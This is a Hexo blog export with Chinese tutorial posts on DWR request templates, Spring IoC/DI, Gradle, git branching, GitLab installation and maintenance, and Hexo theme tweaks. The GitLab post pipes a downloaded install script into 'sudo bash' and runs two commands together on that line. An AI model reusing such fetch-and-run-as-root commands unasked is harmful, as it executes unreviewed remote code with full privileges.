<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;Host:&#123;hostName&#125;&quot; &quot;http://&#123;ip&#125;/&#123;path&#125;/&#123;dwrClass&#125;.&#123;dwrMethod&#125;.dwr&quot; -H &quot;Content-Type: text/plain&quot; -d &quot;&#123;dwrUrlParameter&#125;&quot; -i -v</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring IoC容器与Spring DI</title>
    <url>/technology/2017/02/Spring-IoC%E5%AE%B9%E5%99%A8%E4%B8%8EBean%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="DIP"><a href="#DIP" class="headerlink" title="DIP"></a>DIP</h1><p>即<code>依赖倒置</code>，是一种依赖原则：</p>
<blockquote>
<p>a.高层模块不应该依赖于底层模块，二者都应该依赖于抽象。<br>b.抽象不应该依赖于细节，细节应该依赖于抽象。</p>
</blockquote>
<h1 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h1><p>即<code>控制反转</code>，是一种实现DIP的设计思想</p>
<p>IoC也体现了好莱坞原则</p>
<blockquote>
<p>The Hollywood principle</p>
<p>don‘t call us, we‘ll call you</p>
</blockquote>
<p>IoC容器既是”好莱坞”</p>
<h1 id="DI"><a href="#DI" class="headerlink" title="DI"></a>DI</h1><p>即<code>依赖注入</code>，是一种IoC的基本实现手段（除DI外还有DL（依赖查找）、DP（依赖拖拽）等）</p>
<h2 id="Spring-IoC容器"><a href="#Spring-IoC容器" class="headerlink" title="Spring IoC容器"></a>Spring IoC容器</h2><p>Spring IoC容器其实就是一个应用程序的上下文，根据<a href="http://static.springsource.org/spring/docs/3.2.x/spring-framework-reference/html/beans.html#beans-basics">官方文档</a>，</p>
<blockquote>
<p><code>org.springframework.beans</code>和<code>org.sprinframework.context</code>包是Spring框架的基础IoC容器。<code>BeanFactory</code>接口提供了高级的配置机制来管理任意对象。<code>ApplicationContext</code>是<code>BeanFactory</code>的一个子接口,它增加了更易于集成的Spring AOP特性；消息资源处理(用于国际化),事件发布以及特定的应用层上下文，例如,用于Web应用的<code>WebApplicationContext</code></p>
</blockquote>
<p>在Spring Web应用中， 我们常用到两种IoC容器，它们以不同的配置初始化。一个是<code>Application Context</code>，另一个是<code>Web Application Context</code></p>
<h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><blockquote>
<p>接口<code>org.springframework.context.ApplicationContext</code>提供了一个Spring IoC容器，它代表了beans可靠的实例化、配置化以及组件化。 容器通过读取配置元数据（xml或annotation或Java Code）来实例化、配置或组装对象。</p>
<p><code>Application Context</code>这个容器，由定义在web.xml中的<code>ContextLoaderListener</code>或<code>ContextLoaderServlet</code>初始化，其配置一般如下</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:*-context.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的配置中，我们让spring去加载所有classpath中的-context.xml结尾的文件并且用它们创建了一个应用程序上下文.   这些文件常常包含的是一些在应用中将被用到的中间层事务服务、数据访问或其它对象。基于这个配置，对于每个应用都会有这样一个应用程序上下文。</p>
</blockquote>
<h3 id="WebApplicationContext"><a href="#WebApplicationContext" class="headerlink" title="WebApplicationContext"></a>WebApplicationContext</h3><blockquote>
<p>在Spring MVC框架中，每个<code>DispatcherServlet</code>有它自己的<code>WebApplicationContext</code>，它继承了所有已经定义在根WebApplicationContext中的beans。那些继承的beans可以在具体的servlet作用域中被重载，而且在这个Servlet实例中你可以定义一些有特定作用域的beans</p>
<p><code>WebApplicationContext</code>是一个应用程序上下文的子上下文。每个在Spring Web应用中定义的<code>DispatcherServlet</code>都有一个关联的<code>WebApplicationContext</code>,其一般配置如下</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>platform-services<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:platform-services-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<blockquote>
<p>你需要提供spring配置文件(xml)的名字作为servlet的初始化参数。值得注意的是，这个xml的名字必须是<code>*-servlet.xml</code>的格式。拿上面的配置为例来说，servlet的名字为platform-services，因此xml的名字必须为platform-service-servlet.xml。不论<code>ApplicationContext</code>中定义的beans是否可用，它们都将被每个<code>WebApplicationContext</code>所引用。最佳实践是，保持一个清晰的分层，中间层服务作为业务逻辑组件，而数据访问层（通畅定义在<code>ApplicationContext</code>）和web相关组件作为控制器和视图解析器（通常定义在每个Dispatcher Servlet的<code>WebApplicationContext</code>中）</p>
</blockquote>
<p>参考: <a href="http://static.springsource.org/spring/docs/3.0.x/spring-framework-reference/html/mvc.html#mvc-servlet">understand Spring MVC’s ApplicationContext hierarchy</a> and <a href="http://download.oracle.com/javaee/6/tutorial/doc/bnafd.html">basic components and lifecycles in a servlet container</a> and <a href="http://stackoverflow.com/questions/7746633/declaring-spring-bean-in-parent-context-vs-child-context">application initialization</a></p>
<h2 id="Spring-DI-依赖注入"><a href="#Spring-DI-依赖注入" class="headerlink" title="Spring DI(依赖注入)"></a>Spring DI(依赖注入)</h2><p>依赖注入的对象是bean，也就是各种java对象</p>
<h3 id="被注入Bean的作用域"><a href="#被注入Bean的作用域" class="headerlink" title="被注入Bean的作用域"></a>被注入Bean的作用域</h3><p>Spring中使用scope属性来声明bean的作用域</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.company.class&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;singleton&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>scope取值如下</p>
<table>
<thead>
<tr>
<th><strong>作用域</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>singleton</td>
<td>在每个Spring IoC容器中一个bean定义对应一个对象实例,即单例。如果没有显示声明scope属性，则默认scope为singleton。</td>
</tr>
<tr>
<td>prototype</td>
<td>一个bean定义对应多个对象实例。</td>
</tr>
<tr>
<td>request</td>
<td>在一次HTTP请求中，一个bean定义对应一个实例；即每次HTTP请求将会有各自的bean实例， 它们依据某个bean定义创建而成。该作用域仅在基于web的Spring ApplicationContext情形下有效。</td>
</tr>
<tr>
<td>session</td>
<td>在一个HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的Spring ApplicationContext情形下有效。</td>
</tr>
<tr>
<td>global session</td>
<td>在一个全局的HTTP Session中，一个bean定义对应一个实例。典型情况下，仅在使用portlet context的时候有效。该作用域仅在基于web的Spring ApplicationContext情形下有效。</td>
</tr>
</tbody></table>
<h3 id="集中注入"><a href="#集中注入" class="headerlink" title="集中注入"></a>集中注入</h3><p>对于1控制层、2中间业务层、3数据访问层对象。往往是3注入2，2注入1，如果系统或业务庞杂，那么注入配置会很臃肿，注入关系不清晰，如果你的不是按3-&gt;2-&gt;1这样注入，那可能情况会更糟糕。</p>
<p><img src="http://img.willowspace.cn/confused_injection.png"></p>
<p>控制层、中间业务层、数据访问层的对象往往都是以singleton的形式存在于我们的系统，基于这一点，我们可以对一个类注入同一层中所有的对象，这个类本身再以__singleton__初始化到IoC容器中，哪里需要则注入就可以了。</p>
<p><img src="http://img.willowspace.cn/simple_injection.png"></p>
<p>这里只有典型的三层的对象， 如果有更复杂的分层分块对象需要注入，则更需要集中管理注入。</p>
<h3 id="循环注入"><a href="#循环注入" class="headerlink" title="循环注入"></a>循环注入</h3><p><strong>Circular dependencies</strong></p>
<p>If you use predominantly constructor injection, it is possible to create an unresolvable circular dependency scenario.</p>
<p>For example: Class A requires an instance of class B through constructor injection, and class B requires an instance of class A through constructor injection. If you configure beans for classes A and B to be injected into each other, the Spring IoC container detects this circular reference at runtime, and throws a<code>BeanCurrentlyInCreationException</code>.</p>
<p>One possible solution is to edit the source code of some classes to be configured by setters rather than constructors. Alternatively, avoid constructor injection and use setter injection only. In other words, although it is not recommended, you can configure circular dependencies with setter injection.</p>
<p>Unlike the <em>typical</em> case (with no circular dependencies), a circular dependency between bean A and bean B forces one of the beans to be injected into the other prior to being fully initialized itself (a classic chicken&#x2F;egg scenario).</p>
<p><a href="https://docs.spring.io/spring/docs/3.2.x/spring-framework-reference/html/beans.html#beans-dependency-resolution">link</a></p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>设计模式</tag>
        <tag>编程思想</tag>
      </tags>
  </entry>
  <entry>
    <title>gradle_quick_start</title>
    <url>/technology/2017/01/gradle-quick-start/</url>
    <content><![CDATA[<p>本文介绍使用Gradle快速构建Java项目</p>
<p>由于博主使用的是Intellj IDEA，所以如果你对Intellj IDEA的项目结构不熟悉，那你可能需要先了解一下Intellj IDEA的项目结构：一个project（区别eclipse中的project）+ 多个modules，以下图为例，spring-boot-rmi是项目，greenqiang,laowang,oldwang,xiaoming是4个module</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1485234708330.png"></p>
<h2 id="Gradle准备"><a href="#Gradle准备" class="headerlink" title="Gradle准备"></a>Gradle准备</h2><ul>
<li>安装jdk或者jre，且版本至少是6以上</li>
<li>从<a href="https://gradle.org/">官网</a>安装gradle</li>
</ul>
<h2 id="配置文件与构建脚本"><a href="#配置文件与构建脚本" class="headerlink" title="配置文件与构建脚本"></a>配置文件与构建脚本</h2><p>使用gradle构建项目，项目根目录下会有build.gradle和settings.gradle两个文件(如上图)</p>
<p><strong>settings.gradle</strong> 配置文件</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//多项目（或多modules）管理</span></span><br><span class="line"><span class="comment">//rootProject.name = &quot;spring-boot-rmi&quot; //根项目</span></span><br><span class="line">include <span class="string">&quot;old-wang&quot;</span>, <span class="string">&quot;green-qiang&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>build.gradle</strong> 构建脚本</p>
<ul>
<li>根目录下的构建脚本 &#x2F;build.gradle</li>
</ul>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//项目基本信息</span></span><br><span class="line">group <span class="string">&#x27;cn.willowspace&#x27;</span></span><br><span class="line">version <span class="string">&#x27;1.0-SNAPSHOT&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//allprojects or subprojects</span></span><br><span class="line">allprojects &#123;</span><br><span class="line">  	<span class="comment">//应用插件</span></span><br><span class="line">    apply <span class="attr">plugin:</span> <span class="string">&#x27;java&#x27;</span></span><br><span class="line">	<span class="comment">//指定编译级别</span></span><br><span class="line">    sourceCompatibility = <span class="number">1.8</span></span><br><span class="line">    targetCompatibility = <span class="number">1.8</span></span><br><span class="line">	<span class="comment">//指定依赖仓库</span></span><br><span class="line">    repositories &#123;</span><br><span class="line">        mavenLocal()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        maven &#123;</span><br><span class="line">            url <span class="string">&#x27;http://repo.spring.io/libs-milestone/&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//依赖管理</span></span><br><span class="line">    dependencies &#123;</span><br><span class="line">        <span class="comment">//spring-boot-starter-parent</span></span><br><span class="line">        compile <span class="attr">group:</span> <span class="string">&#x27;org.springframework.boot&#x27;</span>, <span class="attr">name:</span> <span class="string">&#x27;spring-boot&#x27;</span>, <span class="attr">version:</span> <span class="string">&#x27;1.2.8.RELEASE&#x27;</span></span><br><span class="line">        compile <span class="attr">group:</span> <span class="string">&#x27;org.springframework.boot&#x27;</span>, <span class="attr">name:</span> <span class="string">&#x27;spring-boot-starter-web&#x27;</span>, <span class="attr">version:</span> <span class="string">&#x27;1.2.8.RELEASE&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>old-wang子项目的构建脚本 old-wang&#x2F;build.gradle</li>
</ul>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定项目的源码及资源文件路径</span></span><br><span class="line">sourceSets &#123;</span><br><span class="line">    main &#123;</span><br><span class="line">        java &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;old-wang/src/main/java&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resources &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;old-wang/src/main/resources&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>green-qiang子项目的构建脚本 green-qiang&#x2F;build.gradle</li>
</ul>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定项目的源码及资源文件路径</span></span><br><span class="line">sourceSets &#123;</span><br><span class="line">    main &#123;</span><br><span class="line">        java &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;green-qiang/src/main/java&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resources &#123;</span><br><span class="line">            srcDir <span class="string">&#x27;green-qiang/src/main/resources&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过settings.gradle及build.gradle两类文件，我们就可以建立起项目之间的依赖及第三方依赖，一个java项目的基本构建就完成了。</p>
<p>更多gradle相关的用法，参考<a href="https://www.gitbook.com/book/dongchuan/gradle-user-guide-/details">Gradle User Guide 中文版</a></p>
<p><a href="http://www.jetbrains.com/help/idea/2016.3/gradle-2.html">IDEA中Gradle的设置</a> ,特别注意：不要在IDEA里开启offline work选项，否则你可能经常找不到你要的dependencies</p>
<blockquote>
<ul>
<li>Offline work - use this check box to work with Gradle in the offline mode. In this case Gradle will use dependencies from the cache. Gradle will not attempt to access the network to perform dependency resolution. If required dependencies are not present in the dependencies’ cache, a build execution will fail.</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>gradle</tag>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>git分支策略 dev-release-master</title>
    <url>/technology/2017/01/git%E5%88%86%E6%94%AF%E7%AD%96%E7%95%A5-dev-release-master/</url>
    <content><![CDATA[<p>生产工作中，多人协作，为保证分支间工作尽然有序，最常见的方式就是创建开发(dev)、发布(release)、主干(master)三个持久分支，并约定其之间以及与特性(feature)、漏洞修复(bugfix)等临时性分支的操作规范。</p>
<h2 id="开发分支（dev）"><a href="#开发分支（dev）" class="headerlink" title="开发分支（dev）"></a>开发分支（dev）</h2><p>dev分支，持续集成，并发布至测试环境测试。</p>
<h2 id="发布分支（release）"><a href="#发布分支（release）" class="headerlink" title="发布分支（release）"></a>发布分支（release）</h2><p>各个开发者在dev上合并产生的冲突解决掉，并且在测试环境测试通过后稳定的dev，就可以合并至release（<strong>release应当是一个随时可以合并至主干分支，而不会产生问题的分支</strong>）。另一方面release也应该发布至测试环境测试，此时测试的主要执行者是产品经理等角色。</p>
<h2 id="主干分支（master）"><a href="#主干分支（master）" class="headerlink" title="主干分支（master）"></a>主干分支（master）</h2><p>master分支是稳定的可发布至线上的分支，发布上线之前合并最新的release分支，然后由项目负责人执行发布上线相关操作。</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>gitlab版本管理</title>
    <url>/technology/2017/08/gitlab%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><p>安装环境为：<code>ubuntu</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装并配置必须的依赖</span></span><br><span class="line">sudo apt-get install -y curl openssh-server ca-certificates</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加gitlab包及服务并安装gitlab包</span></span><br><span class="line">curl -sS https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash sudo apt-get install gitlab-ce</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置并启动gitlab</span></span><br><span class="line">sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<h1 id="二、配置gitlab访问域名及端口"><a href="#二、配置gitlab访问域名及端口" class="headerlink" title="二、配置gitlab访问域名及端口"></a>二、配置gitlab访问域名及端口</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开gitlab配置文件</span></span><br><span class="line">vim /etc/gitlab/gitlab.rb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改访问入口项</span></span><br><span class="line">external_url &#x27;http://code.domain.com:$&#123;port&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="三、访问并设置初始密码"><a href="#三、访问并设置初始密码" class="headerlink" title="三、访问并设置初始密码"></a>三、访问并设置初始密码</h1><p>初始账号为root，第一次访问时会要求重置密码</p>
<h1 id="四、初始化项目"><a href="#四、初始化项目" class="headerlink" title="四、初始化项目"></a>四、初始化项目</h1><h5 id="Git-global-setup"><a href="#Git-global-setup" class="headerlink" title="Git global setup"></a>Git global setup</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;willow&quot;</span><br><span class="line">git config --global user.email &quot;admin@example.com&quot;</span><br></pre></td></tr></table></figure>

<h5 id="Create-a-new-repository"><a href="#Create-a-new-repository" class="headerlink" title="Create a new repository"></a>Create a new repository</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git@code.willowspace.cn:root/willow.git</span><br><span class="line">cd willow</span><br><span class="line">touch README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;add README&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>

<h5 id="Existing-folder"><a href="#Existing-folder" class="headerlink" title="Existing folder"></a>Existing folder</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd existing_folder</span><br><span class="line">git init</span><br><span class="line">git remote add origin git@code.willowspace.cn:root/willow.git</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;Initial commit&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>

<h5 id="Existing-Git-repository"><a href="#Existing-Git-repository" class="headerlink" title="Existing Git repository"></a>Existing Git repository</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd existing_repo</span><br><span class="line">git remote add origin git@code.willowspace.cn:root/willow.git</span><br><span class="line">git push -u origin --all</span><br><span class="line">git push -u origin --tags</span><br></pre></td></tr></table></figure>

<h1 id="五、常规维护"><a href="#五、常规维护" class="headerlink" title="五、常规维护"></a>五、常规维护</h1><h2 id="启停"><a href="#启停" class="headerlink" title="启停"></a>启停</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动Gitlab所有组件</span></span><br><span class="line">sudo gitlab-ctl start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止Gitlab所有组件</span></span><br><span class="line">sudo gitlab-ctl stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启Gitlab所有组件</span></span><br><span class="line">sudo gitlab-ctl restart</span><br></pre></td></tr></table></figure>

<h2 id="备份配置"><a href="#备份配置" class="headerlink" title="备份配置"></a>备份配置</h2><p>打包<code>/etc/gitlab/</code>下所有文件</p>
<h2 id="备份数据"><a href="#备份数据" class="headerlink" title="备份数据"></a>备份数据</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gitlab-rake gitlab:backup:create</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">产生的备份包名形如下</span></span><br><span class="line">1490183942_2017_03_22_gitlab_backup.tar</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">备份文件位于/var/opt/gitlab/backups路径下</span></span><br></pre></td></tr></table></figure>

<h2 id="恢复数据"><a href="#恢复数据" class="headerlink" title="恢复数据"></a>恢复数据</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gitlab-ctl stop unicorn</span><br><span class="line">sudo gitlab-ctl stop sidekiq</span><br><span class="line">sudo gitlab-ctl status</span><br><span class="line">sudo gitlab-rake gitlab:backup:restore BACKUP=1490183942_2017_03_22</span><br></pre></td></tr></table></figure>

<h1 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gitlab-ctl stop</span><br><span class="line">sudo gitlab-ctl uninstall</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除所有gitlab文件，在根目录下find -name gitlab*，找到所有相关文件，然后执行删除。</span></span><br><span class="line">find -name gitlab*</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>代码版本管理</tag>
        <tag>持续集成</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello Hexo</title>
    <url>/technology/2017/01/hello-hexo/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
<blockquote>
<p>一些特定的使用场景</p>
</blockquote>
<p>我使用的主题是<a href="https://github.com/iissnan/hexo-theme-next">next</a>，关于next的基本配置及用法可以参考<a href="http://theme-next.iissnan.com/">文档</a>,以下是我在使用hexo及next过程中碰到的特殊(文档中未找到描述)使用场景</p>
<h2 id="自定义新建文章的默认基本信息"><a href="#自定义新建文章的默认基本信息" class="headerlink" title="自定义新建文章的默认基本信息"></a>自定义新建文章的默认基本信息</h2><p>例如默认的categories几tags信息</p>
<p>可以修改{hexo}&#x2F;scaffolds&#x2F;post.md文件</p>
<h2 id="自定义domain来访问博客"><a href="#自定义domain来访问博客" class="headerlink" title="自定义domain来访问博客"></a>自定义domain来访问博客</h2><p>为达成这样的效果须要在对应git仓库下新建CNAME文件，而没有配置的情况下CNAME是会在新的发布中被删除的。</p>
<p>可以在{hexo}&#x2F;source目录下简历CNAME文件（文件中写入你的domain），这样CNAME也会被发布</p>
<p>其他须要发布的东西理同上</p>
<h2 id="修改主题layout中的模板文件"><a href="#修改主题layout中的模板文件" class="headerlink" title="修改主题layout中的模板文件"></a>修改主题layout中的模板文件</h2><p>在next主题的目录下有一个layout目录，这是主题的模板文件。这些文件都是以swig结尾，<a href="http://www.swig.org/translations/chinese/index.html">SWIG</a>是个帮助使用C或者C++编写的软件能与其它各种高级编程语言进行嵌入联接的开发工具。</p>
<p>如果需要修改主题的样式布局结构等，修改这些swig模板文件即可达到目的</p>
<h2 id="在文章底部添加licence信息"><a href="#在文章底部添加licence信息" class="headerlink" title="在文章底部添加licence信息"></a>在文章底部添加licence信息</h2><p>我使用的是<a href="https://creativecommons.org/licenses/by-nc-nd/3.0/">Creative Commons 知识共享许可协议</a>，协议内容详见<a href="https://creativecommons.org/licenses/by-nc-nd/3.0/cn/legalcode">这里</a></p>
<p>找到${next}&#x2F;layout&#x2F;_macro&#x2F;post.swig，将许可证官网复制的相关代码粘贴至文章指定位置即可</p>
<h2 id="使用next与hexo的内置标签来书写markdown"><a href="#使用next与hexo的内置标签来书写markdown" class="headerlink" title="使用next与hexo的内置标签来书写markdown"></a>使用next与hexo的内置标签来书写markdown</h2><p><a href="http://theme-next.iissnan.com/tag-plugins.html">next文档中的内置标签</a>，更多内置标签参照<a href="https://hexo.io/docs/tag-plugins.html">hexo内置标签</a></p>
<h2 id="开启首页的文章摘要"><a href="#开启首页的文章摘要" class="headerlink" title="开启首页的文章摘要"></a>开启首页的文章摘要</h2><p>在主题配置中找到excerpt相关配置</p>
<h2 id="处理摘要中的代码块"><a href="#处理摘要中的代码块" class="headerlink" title="处理摘要中的代码块"></a>处理摘要中的代码块</h2><p>首页一般都会显示文章摘要，而摘要中如果包含一部分markdown的代码块，则可能出现一长串编码超出容器</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1485056475711.png"></p>
<p>这时可以修改swig模板，添加css的word-break属性来处理这种情况。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;word-break:break-all;word-break:break-word;&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; content.substring(0, theme.auto_excerpt.length) &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="开启多说评论的邮件提醒"><a href="#开启多说评论的邮件提醒" class="headerlink" title="开启多说评论的邮件提醒"></a>开启多说评论的邮件提醒</h2><p>参考这篇<a href="http://www.tuicool.com/articles/iEN7riZ">博客</a></p>
<h2 id="修改文章字体相关属性"><a href="#修改文章字体相关属性" class="headerlink" title="修改文章字体相关属性"></a>修改文章字体相关属性</h2><ol>
<li>正文字体大小 _<em>${next}&#x2F;source&#x2F;css&#x2F;<em>common&#x2F;scaffolding&#x2F;base.styl</em></em> 中的body标签</li>
</ol>
<h2 id="添加页内链接"><a href="#添加页内链接" class="headerlink" title="添加页内链接"></a>添加页内链接</h2><ol>
<li><p>制作一个hash链接</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;hash&quot;</span>&gt;</span>content<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在需要的地方链接到hash链</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">hash</span>](<span class="link">#hash</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="添加网易云音乐播放器"><a href="#添加网易云音乐播放器" class="headerlink" title="添加网易云音乐播放器"></a>添加网易云音乐播放器</h2><p>如果只是加入单曲，只需要搜索歌曲，点开歌曲名，点击生成外链播放器，复制html代码（可以选择是否自动播放），将html代码无需任何修改放入markdown文章里就OK了。</p>
